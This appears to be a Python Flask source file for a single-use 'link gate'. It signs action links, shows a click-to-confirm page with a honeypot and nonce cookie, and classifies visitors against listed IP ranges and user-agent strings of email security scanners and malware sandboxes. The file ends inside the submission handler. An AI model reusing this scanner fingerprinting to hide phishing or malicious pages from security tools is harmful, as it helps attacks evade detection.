import os
import time
import json
import secrets
import logging
from ipaddress import ip_address, ip_network

import httpx
from flask import (
    Flask, request, redirect, render_template_string,
    make_response, jsonify,
)
from itsdangerous import URLSafeTimedSerializer, BadSignature, SignatureExpired
from asgiref.wsgi import WsgiToAsgi

# ---------------------------------------------------------------------------
# config
# ---------------------------------------------------------------------------
SK = os.environ.get("SECRET_KEY")
if not SK:
    raise RuntimeError("SECRET_KEY env var required")
if len(SK) < 32:
    raise RuntimeError("SECRET_KEY must be >= 32 chars")

GATE_TTL = int(os.environ.get("GATE_TTL_SECONDS", "900"))
TOKEN_TTL = int(os.environ.get("TOKEN_TTL_SECONDS", str(60 * 60 * 24 * 7)))
LOG_WEBHOOK_URL = os.environ.get("LOG_WEBHOOK_URL", "")
KV_URL = os.environ.get("KV_REST_API_URL", "")
KV_TOKEN = os.environ.get("KV_REST_API_TOKEN", "")

app = Flask(__name__)
app.secret_key = SK.encode()
serializer = URLSafeTimedSerializer(app.secret_key, salt="link-gate")
cookie_serializer = URLSafeTimedSerializer(app.secret_key, salt="cookie-gate")

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("link-gate")

# ---------------------------------------------------------------------------
# known scanner networks & UAs
# ---------------------------------------------------------------------------
EOP = [
    ip_network("40.92.0.0/15"), ip_network("40.107.0.0/16"),
    ip_network("52.100.0.0/14"), ip_network("104.47.0.0/17"),
    ip_network("13.107.6.152/31"), ip_network("13.107.18.10/31"),
    ip_network("13.107.128.0/22"), ip_network("23.103.160.0/20"),
]
PROOFPOINT = [ip_network("148.163.0.0/16"), ip_network("67.231.144.0/20")]
MIMECAST = [ip_network("207.211.30.0/23"), ip_network("91.220.42.0/24")]
BARRACUDA = [ip_network("64.235.144.0/20"), ip_network("209.240.128.0/19")]
TALOS = [ip_network("208.75.176.0/22"), ip_network("216.160.0.0/19")]
GOOGLE_SAFEBROWSING = [ip_network("66.249.64.0/19"), ip_network("2001:4860::/32")]

SCANNER_NETS = {
    "microsoft_eop": EOP, "proofpoint": PROOFPOINT, "mimecast": MIMECAST,
    "barracuda": BARRACUDA, "cisco_talos": TALOS, "google_safebrowsing": GOOGLE_SAFEBROWSING,
}

SCANNER_UA_TOKENS = (
    "microsoft office", "safelinks", "microsoft preview", "proofpoint",
    "pp-url", "mimecast", "barracuda", "talos", "urlscan", "urlscan.io",
    "virustotal", "any.run", "hybrid-analysis", "joesandbox", "googlebot",
    "google-safety", "bingpreview", "facebookexternalhit", "slackbot",
    "twitterbot", "linkedinbot", "discordbot", "telegrambot", "whatsapp",
    "skypeuripreview",
)

def client_ip() -> str:
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return request.remote_addr or ""

def classify(ip: str, ua: str) -> dict:
    out = {"ip": ip, "ua": ua, "scanner": False, "source": None, "method": None}
    try:
        a = ip_address(ip)
    except ValueError:
        a = None
    if a is not None:
        for name, nets in SCANNER_NETS.items():
            if any(a in n for n in nets):
                out["scanner"] = True
                out["source"] = name
                out["method"] = "ip"
                break
    if not out["scanner"]:
        low = ua.lower()
        for tok in SCANNER_UA_TOKENS:
            if tok in low:
                out["scanner"] = True
                out["source"] = tok
                out["method"] = "ua"
                break
    return out

async def kv_setnx(key: str, ttl: int) -> bool:
    if not KV_URL or not KV_TOKEN:
        return _local_setnx(key, ttl)
    async with httpx.AsyncClient(timeout=3.0) as c:
        try:
            r = await c.post(
                f"{KV_URL}/set/{key}",
                headers={"Authorization": f"Bearer {KV_TOKEN}"},
                content=b"1",
                params={"NX": "1", "EX": str(ttl)},
            )
            r.raise_for_status()
            return r.json().get("result") == "OK"
        except Exception as e:
            log.error(f"External KV storage failure: {e}")
            return False

_LOCAL_SEEN: dict[str, float] = {}

def _local_setnx(key: str, ttl: int) -> bool:
    now = time.time()
    for k in [k for k, exp in _LOCAL_SEEN.items() if exp < now]:
        _LOCAL_SEEN.pop(k, None)
    if key in _LOCAL_SEEN:
        return False
    _LOCAL_SEEN[key] = now + ttl
    return True

async def emit_log(event: dict) -> None:
    log.info(json.dumps(event, separators=(",", ":")))
    if LOG_WEBHOOK_URL:
        try:
            async with httpx.AsyncClient(timeout=3.0) as c:
                await c.post(LOG_WEBHOOK_URL, json=event)
        except httpx.HTTPError:
            pass

def _static_page(title: str, text: str, status_code: int):
    html = f"""<!doctype html><html><head><meta charset="utf-8"><title>{title}</title>
    <style>body{{font-family:system-ui,sans-serif;display:grid;place-items:center;min-height:100vh;margin:0;background:#f6f7f9}}
    .c{{background:#fff;padding:2rem;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.05);text-align:center;max-width:400px}}</style>
    </head><body><div class="c"><h1>{title}</h1><p>{text}</p></div></body></html>"""
    return make_response(html, status_code)

LANDING = """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<meta name="referrer" content="no-referrer">
<title>{{ title }}</title>
<style>
  :root { color-scheme: light; }
  body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;display:grid;place-items:center;min-height:100vh;margin:0;background:#f6f7f9;padding:1rem}
  .card{background:#fff;padding:2rem 2.5rem;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.08);max-width:440px;width:100%;text-align:center;box-sizing:border-box}
  h1{font-size:1.25rem;margin:0 0 1rem;color:#111;font-weight:600}
  p{color:#444;margin:0 0 1.5rem;line-height:1.5;font-size:.95rem}
  button{background:#0b5fff;color:#fff;border:0;padding:.8rem 1.6rem;border-radius:8px;font-size:1rem;cursor:pointer;width:100%}
  button:hover{background:#0847c4}
  .hp-field{position:absolute !important;left:-10000px !important;width:1px !important;height:1px !important;overflow:hidden}
</style>
</head>
<body>
  <form class="card" method="POST" action="{{ action }}" autocomplete="off">
    <h1>{{ title }}</h1>
    <p>{{ body }}</p>
    <input type="text" name="email_confirm_hp" class="hp-field" autocomplete="off" tabindex="-1" aria-hidden="true">
    <input type="hidden" name="t" value="{{ token }}">
    <input type="hidden" name="n" value="{{ nonce }}">
    <button type="submit">{{ cta }}</button>
  </form>
</body>
</html>"""

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"ok": True, "ts": int(time.time())})

# --- ROUTE 1: Clean GET Landing Page Execution Only ---
@app.route("/r/<token>", methods=["GET"])
async def landing(token: str):
    try:
        data = serializer.loads(token, max_age=TOKEN_TTL)
    except SignatureExpired:
        return _static_page("Link expired", "This link is no longer valid.", 410)
    except BadSignature:
        return _static_page("Invalid link", "This link is not valid.", 404)

    nonce = secrets.token_urlsafe(16)
    payload = {"t": token, "n": nonce, "ts": time.time()}
    cookie_val = cookie_serializer.dumps(payload)

    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
    await emit_log({"event": "landing_get", **tag, "token": token[:12]})

    html = render_template_string(
        LANDING,
        action=f"/submit/{token}",  # Points cleanly to distinct submission route
        token=token,
        nonce=nonce,
        title=data.get("title", "Confirm your request"),
        body=data.get("body", "Click the button below to continue."),
        cta=data.get("cta", "Click here to confirm"),
    )
    
    resp = make_response(html)
    resp.set_cookie(
        "gate_session",
        cookie_val,
        max_age=GATE_TTL,
        httponly=True,
        secure=True,
        samesite="Lax"
    )
    return resp

# --- ROUTE 2: Clean POST Verification Processing Only ---
@app.route("/submit/<token>", methods=["POST"])
async def execute(token: str):
    if request.form.get("email_confirm_hp"):
        return _static_page("Submission Blocked", "Automated behavior detected.", 400)

    submitted_nonce = request.form.get("n", "")
    cookie_val = request.cookies.get("gate_session")

    if not cookie_val or not submitted_nonce:
        return _static_page("Missing Context", "Session cookie or verification payload missing.", 400)

    try:
        cookie_data = cookie_serializer.loads(cookie_val, max_age=GATE_TTL)
    except (SignatureExpired, BadSignature):
        return _static_page("Session Expired", "Your request security verification context expired.", 400)

    is_nonce_valid = secrets.compare_digest(cookie_data["n"], submitted_nonce)
    is_token_valid = secrets.compare_digest(cookie_data["t"], token)
    is_fresh = (time.time() - cookie_data["ts"]) < GATE_TTL

    if not (is_nonce_valid and is_token_valid and is_fresh):
        return _static_page("Verification Failed", "Security context verification payload mismatched.", 400)

    is_first_click = await kv_setnx(f"click:{token[:32]}:{submitted_nonce}", GATE_TTL)
    if not is_first_click:
        return _static_page("Link Consumed", "This single-use action link has already been utilized.", 410)

    try:
        data = serializer.loads(token, max_age=TOKEN_TTL)
    except (SignatureExpired, BadSignature):
        return _static_page("Invalid Token", "Target signature metadata validation error.", 410)

    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
    await emit_log({"event": "landing_post", **tag, "token": token[:12]})
